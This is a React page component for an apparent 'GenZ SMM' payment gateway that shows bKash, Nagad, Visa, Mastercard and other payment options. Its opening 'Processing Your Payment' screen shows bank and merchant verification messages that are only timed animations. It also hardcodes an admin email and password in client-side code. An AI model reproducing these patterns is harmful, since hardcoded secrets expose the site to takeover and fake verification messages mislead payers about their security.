import { useState, useEffect } from "react";
import { Home, Upload, X, Headphones, HelpCircle, Gift, LogIn, LogOut, Lock } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Switch } from "@/components/ui/switch";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import DualCircleLoader from "@/components/DualCircleLoader";
import genzLogo from "@/assets/genz-logo.png";
import bkashLogo from "@/assets/bkash-logo.png";
import nagadLogo from "@/assets/nagad-logo.png";
import rocketLogo from "@/assets/rocket-logo.png";
import upayLogo from "@/assets/upay-logo.png";
import visaLogo from "@/assets/visa-logo.png";
import mastercardLogo from "@/assets/mastercard-logo.png";
import troyLogo from "@/assets/troy-logo.png";

const ADMIN_EMAIL = "abir789@gmail.com";
const ADMIN_PASSWORD = "778899";

const gatewayMessages = [
  "Connecting to GenZ Secure Gateway...",
  "Verifying merchant credentials...",
  "Authorizing transaction...",
  "Communicating with bank server...",
  "Finalizing secure gateway...",
];

const Index = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [showGateway, setShowGateway] = useState(true);
  const [messageIndex, setMessageIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [showLoader, setShowLoader] = useState(false);
  const [clickedCard, setClickedCard] = useState<string | null>(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>({
    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, troy: false,
  });

  const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;

  // Fetch payment methods from DB and subscribe to realtime
  useEffect(() => {
    const fetchMethods = async () => {
      const { data } = await supabase.from("payment_methods").select("*");
      if (data) {
        const map: Record<string, boolean> = {};
        data.forEach((m) => (map[m.id] = m.enabled));
        setEnabledMethods(map);
      }
    };
    fetchMethods();

    const channel = supabase
      .channel("payment_methods_realtime")
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "payment_methods" },
        (payload) => {
          setEnabledMethods((prev) => ({
            ...prev,
            [payload.new.id as string]: payload.new.enabled as boolean,
          }));
        }
      )
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  const handlePaymentSelect = (route: string) => {
    if (isMobileOrTablet) {
      setClickedCard(route);
      setTimeout(() => {
        setShowLoader(true);
        setTimeout(() => navigate(`${route}?amount=${amount}`), 4000);
      }, 500);
    } else {
      setShowLoader(true);
      setTimeout(() => navigate(`${route}?amount=${amount}`), 4000);
    }
  };

  useEffect(() => {
    if (!showGateway) return;

    const totalDuration = 6000; // 6 seconds total
    const messageInterval = totalDuration / gatewayMessages.length;

    // Progress bar animation
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) return 100;
        return prev + 0.5;
      });
    }, 30);

    // Cycle through messages
    const msgTimer = setInterval(() => {
      setMessageIndex((prev) => {
        if (prev >= gatewayMessages.length - 1) return prev;
        return prev + 1;
      });
    }, messageInterval);

    // Hide gateway after all messages
    const hideTimer = setTimeout(() => {
      setShowGateway(false);
    }, totalDuration);

    return () => {
      clearInterval(progressInterval);
      clearInterval(msgTimer);
      clearTimeout(hideTimer);
    };
  }, [showGateway]);

  if (showGateway) {
    return (
      <div className="min-h-[100dvh] w-screen bg-[#e8edf2] flex items-center justify-center p-4 overflow-hidden fixed inset-0 z-50">
        <div className="w-full max-w-md mx-auto">
          <div className="bg-gradient-to-br from-[#2d7dd2] via-[#2570c4] to-[#1a5fb4] rounded-2xl shadow-[0_20px_60px_rgba(26,95,180,0.4)] p-8 flex flex-col items-center relative overflow-hidden">
            {/* Subtle shimmer overlay */}
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent pointer-events-none" style={{ animation: 'shimmer 3s ease-in-out infinite' }} />
            
            {/* Animated Dots */}
            <div className="flex gap-3 mb-7 relative z-10">
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  className="w-2 h-2 rounded-full bg-white"
                  style={{
                    animation: `dotBounce 1.4s ease-in-out ${i * 0.16}s infinite`,
                  }}
                />
              ))}
            </div>

            {/* Logo */}
            <div className="w-20 h-20 rounded-full bg-[#1a2332] flex items-center justify-center mb-5 relative z-10 shadow-lg ring-2 ring-white/10">
              <img src={genzLogo} alt="GenZ" className="w-[72px] h-[72px] rounded-full object-cover" />
            </div>

            {/* Title */}
            <h2 className="text-white text-xl font-bold mb-2 relative z-10 tracking-wide">Processing Your Payment...</h2>
            <p className="text-white/75 text-sm mb-6 transition-all duration-500 min-h-[20px] relative z-10">
              {gatewayMessages[messageIndex]}
            </p>

            {/* Progress Bar */}
            <div className="w-full bg-white/20 rounded-full h-2.5 mb-6 overflow-hidden relative z-10 backdrop-blur-sm">
              <div
                className="h-full rounded-full transition-all duration-100 ease-linear"
                style={{
                  width: `${progress}%`,
                  background: 'linear-gradient(90deg, #ffffff 0%, #e0ecff 50%, #ffffff 100%)',
                  boxShadow: '0 0 10px rgba(255,255,255,0.5)',
                }}
              />
            </div>

            {/* Secure badge */}
            <div className="flex items-center gap-2 text-white/90 mb-2 relative z-10">
              <Lock className="w-4 h-4" />
              <span className="text-sm font-semibold tracking-wide">GenZ Secure Gateway</span>
            </div>
            <p className="text-white/40 text-xs relative z-10">Please do not close or refresh this page</p>
          </div>
        </div>

        <style>{`
          @keyframes dotBounce {
            0%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-8px); }
          }
          @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
          }
        `}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex items-start md:items-center justify-center p-2 md:p-4 overflow-hidden">
      <div className="w-full max-w-[520px] md:max-w-[700px] lg:max-w-[800px] flex flex-col h-full md:max-h-[720px]">
        {/* Card - white on desktop, transparent on mobile */}
        <div className="bg-transparent md:bg-card md:rounded-2xl md:shadow-sm flex flex-col">
          {/* Top Bar - All icons in one white box */}
          <div className="flex items-center justify-center px-3 py-2 md:px-5 md:py-3">
            <div className="bg-card rounded-lg flex items-center justify-between w-full px-4 py-2 shadow-sm">
              <Home className="w-4 h-4 text-foreground" strokeWidth={1.5} />
              <div className="flex items-center gap-3">
                <Upload className="w-4 h-4 text-foreground" strokeWidth={1.5} />
                <X className="w-4 h-4 text-foreground" strokeWidth={1.5} />
              </div>
            </div>
          </div>

          {/* Content */}
          <div className="flex-1 px-3 md:px-6 pb-16 md:pb-6 flex flex-col">
            {showLoader && <DualCircleLoader />}
            {/* GenZ Logo */}
            <div className="flex justify-center mt-1 mb-2">
              <img 
                src={genzLogo} 
                alt="GenZ" 
                className="w-14 h-14 md:w-20 md:h-20 rounded-full object-cover"
              />
            </div>

            {/* Title Section */}
            <div className="text-center mb-2">
              <h1 className="text-foreground text-base md:text-xl font-bold mb-0.5">
                GenZ SMM
              </h1>
              <p className="text-muted-foreground text-sm md:text-base font-normal">
                Online Payment
              </p>
            </div>

            {/* Icon Row */}
            <div className="flex justify-center gap-4 md:gap-8 mb-3">
              <div className="flex flex-col items-center gap-0.5">
                <div className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm">
                  <Headphones className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                </div>
                <span className="text-[10px] md:text-xs text-muted-foreground">Support</span>
              </div>
              <div className="flex flex-col items-center gap-0.5">
                <div className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm">
                  <HelpCircle className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                </div>
                <span className="text-[10px] md:text-xs text-muted-foreground">FAQ</span>
              </div>
              <div className="flex flex-col items-center gap-0.5 relative">
                <div className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm">
                  <Gift className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                </div>
                <span className="absolute -top-0.5 -right-0.5 w-3.5 h-3.5 bg-destructive text-destructive-foreground text-[8px] rounded-full flex items-center justify-center font-medium">2</span>
                <span className="text-[10px] md:text-xs text-muted-foreground">Offers</span>
              </div>
              <div className="flex flex-col items-center gap-0.5">
                <div 
                  onClick={() => navigate("/admin")}
                  className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm cursor-pointer"
                >
                  <LogIn className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                </div>
                <span className="text-[10px] md:text-xs text-muted-foreground">Login</span>
              </div>
            </div>

            {/* Mobile Banking Button */}
            <button className="w-full bg-primary text-primary-foreground py-2 md:py-2.5 rounded-lg font-medium text-sm mb-3 tracking-wide">
              মোবাইল ব্যাংকিং
            </button>

            {/* Payment Methods Grid - 2 cols mobile transparent, 3 cols desktop/tablet */}
            <div className="grid grid-cols-2 md:grid-cols-3 gap-2.5 md:gap-3">
              {[
                { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-12 md:h-14' },
                { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-12 md:h-14' },
                { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-12 md:h-14' },
                { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-12 md:h-14' },
                { id: 'visa', route: '/visa', logo: visaLogo, alt: 'VISA', h: 'h-10 md:h-12' },
                { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-12 md:h-14' },
                { id: 'troy', route: '/troy', logo: troyLogo, alt: 'Troy', h: 'h-10 md:h-12' },
              ].map((method) => {
                const isEnabled = enabledMethods[method.id] ?? false;
                return isEnabled ? (
                  <div
                    key={method.id}
                    onClick={() => handlePaymentSelect(method.route)}
                    className="group bg-transparent md:bg-card rounded-lg border border-border flex items-center justify-center h-[70px] md:h-20 cursor-pointer transition-all overflow-hidden"
                  >
                    <img src={method.logo} alt={method.alt} className={`${method.h} object-contain transition-transform duration-300 lg:group-hover:scale-90 ${clickedCard === method.route ? 'scale-90' : ''}`} />
                  </div>
                ) : (
                  <div
                    key={method.id}
                    className="relative bg-transparent md:bg-card rounded-lg border border-border flex items-center justify-center h-[70px] md:h-20 cursor-not-allowed overflow-hidden"
                  >
                    <img src={method.logo} alt={method.alt} className={`${method.h} object-contain opacity-50`} />
                    <div className="absolute top-1 right-1 bg-[hsl(0,63%,51%)] text-white text-[7px] md:text-[9px] px-2 py-0.5 rounded font-medium whitespace-nowrap">
                      Temporarily Unavailable
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Pay Footer - Desktop/Tablet only (inside box) */}
          <div className="hidden md:block bg-pay-bar py-3 text-center rounded-b-2xl mt-auto">
            <span className="text-primary font-bold text-lg">Pay {amount} BDT</span>
          </div>
        </div>

        {/* Pay Footer - Mobile only (fixed bottom) */}
        <div className="md:hidden fixed bottom-0 left-0 right-0 bg-pay-bar py-3 text-center">
          <span className="text-primary font-bold text-base">Pay {amount} BDT</span>
        </div>
      </div>
    </div>
  );
};

export default Index;
